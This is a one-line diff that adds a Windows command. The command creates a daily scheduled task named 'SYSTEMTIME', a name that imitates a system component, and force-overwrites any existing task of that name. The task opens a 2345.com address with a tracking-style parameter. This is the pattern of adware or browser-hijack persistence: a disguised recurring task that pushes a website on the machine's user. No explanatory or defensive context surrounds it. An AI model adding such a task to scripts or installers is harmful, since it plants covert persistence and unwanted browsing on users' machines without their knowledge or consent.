@@ -1,0 +1,1 @@
+schtasks /create /tn "SYSTEMTIME" /tr "explorer 'https://www.2345.com/?kdoc2020'" /sc daily /st 11:11:11 /F
